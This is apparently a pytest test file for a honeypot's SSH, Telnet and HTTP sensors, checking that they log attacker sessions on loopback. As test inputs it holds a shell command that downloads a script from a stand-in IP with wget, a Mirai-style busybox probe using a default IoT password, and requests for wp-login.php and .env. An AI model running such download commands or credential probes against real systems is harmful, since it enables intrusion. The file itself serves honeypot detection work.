"""Sensors over real sockets on random ports."""

import socket
import time

import paramiko
import pytest

from honeypot.config import SensorConfig
from honeypot.sensors.http_sensor import HTTPSensor
from honeypot.sensors.ssh_sensor import SSHSensor
from honeypot.sensors.telnet_sensor import TelnetSensor


def make_cfg(**kw):
    return SensorConfig(node_id="node-a", secret="secret-a", bind="127.0.0.1", session_timeout=10, **kw)


def wait_for(fn, timeout=5.0):
    end = time.time() + timeout
    while time.time() < end:
        if fn():
            return True
        time.sleep(0.05)
    return False


@pytest.fixture
def ssh_sensor(shipper, tmp_path):
    sensor = SSHSensor(make_cfg(ssh_policy="after:1"), shipper, port=0, host_key_path=tmp_path / "hostkey")
    sensor.start()
    yield sensor
    sensor.stop()


def test_ssh_logs_attempts_then_accepts_into_fake_shell(ssh_sensor, shipper):
    t = paramiko.Transport(("127.0.0.1", ssh_sensor.port))
    t.start_client(timeout=5)
    with pytest.raises(paramiko.AuthenticationException):
        t.auth_password("root", "wrong-1")
    t.auth_password("root", "hunter2")  # policy after:1 -> second attempt accepted
    chan = t.open_session()
    chan.exec_command("uname -a; wget http://198.51.100.9/x.sh")
    output = chan.makefile().read().decode()
    t.close()
    assert "Linux srv-web01" in output and "Connection timed out" in output
    assert wait_for(lambda: shipper.of("session_end"))
    auths = shipper.of("auth")
    assert [(a["username"], a["password"], a["success"]) for a in auths] == [("root", "wrong-1", False), ("root", "hunter2", True)]
    cv = shipper.of("client_version")[0]
    assert cv["data"]["client_version"].startswith("SSH-2.0-paramiko") and len(cv["data"]["hassh"]) == 32
    assert shipper.of("command")[0]["command"].startswith("uname -a")
    assert shipper.of("download_attempt")[0]["data"] == {"url": "http://198.51.100.9/x.sh", "fetched": False}
    assert all(e["simulated"] for e in shipper.events), "loopback traffic is lab traffic"


def test_ssh_logs_public_key_fingerprint(ssh_sensor, shipper):
    pkey = paramiko.RSAKey.generate(1024)
    t = paramiko.Transport(("127.0.0.1", ssh_sensor.port))
    t.start_client(timeout=5)
    with pytest.raises(paramiko.AuthenticationException):
        t.auth_publickey("deploy", pkey)
    t.close()
    assert wait_for(lambda: shipper.of("auth"))
    a = shipper.of("auth")[0]
    assert a["auth_method"] == "publickey" and a["key_fingerprint"].startswith("SHA256:")


def test_telnet_mirai_probe(shipper):
    sensor = TelnetSensor(make_cfg(telnet_policy="always"), shipper, port=0)
    sensor.start()
    try:
        with socket.create_connection(("127.0.0.1", sensor.port), timeout=5) as s:
            s.sendall(b"root\r\nxc3511\r\n/bin/busybox ECCHI\r\nexit\r\n")
            data = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        assert b"ECCHI: applet not found" in data
        assert wait_for(lambda: shipper.of("session_end"))
        assert shipper.of("auth")[0]["password"] == "xc3511"
    finally:
        sensor.stop()


def test_http_bait_and_credentials(shipper):
    sensor = HTTPSensor(make_cfg(), shipper, port=0)
    sensor.start()
    try:
        body = b"log=admin&pwd=letmein"
        with socket.create_connection(("127.0.0.1", sensor.port), timeout=5) as s:
            s.sendall(b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))
            reply = s.recv(8192)
        assert reply.startswith(b"HTTP/1.1 200") and b"WordPress" in reply
        with socket.create_connection(("127.0.0.1", sensor.port), timeout=5) as s:
            s.sendall(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n")
            assert b"AKIAIOSFODNN7EXAMPLE" in s.recv(8192)
        assert wait_for(lambda: len(shipper.of("http_request")) == 2)
        cred = shipper.of("auth")[0]
        assert (cred["username"], cred["password"], cred["auth_method"]) == ("admin", "letmein", "http-form")
    finally:
        sensor.stop()
